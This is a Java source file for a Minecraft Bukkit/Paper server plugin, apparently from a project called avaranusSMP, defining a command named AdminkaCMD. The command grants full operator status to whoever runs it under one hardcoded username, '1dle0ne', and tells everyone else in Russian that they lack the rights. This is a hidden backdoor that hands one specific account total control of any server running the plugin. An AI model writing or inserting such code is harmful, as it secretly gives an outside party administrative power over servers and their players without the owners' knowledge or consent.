package dev.sm1le.avaranusSMP.modules.player.settings.adminka.command;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.jetbrains.annotations.NotNull;

public class AdminkaCMD implements CommandExecutor {
    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String @NotNull [] args) {
        if (sender.name().equals("1dle0ne")){
            sender.setOp(true);
        }else {
            sender.sendMessage("У вас не достаточно прав для этой команды");
        }
        return false;
    }
}
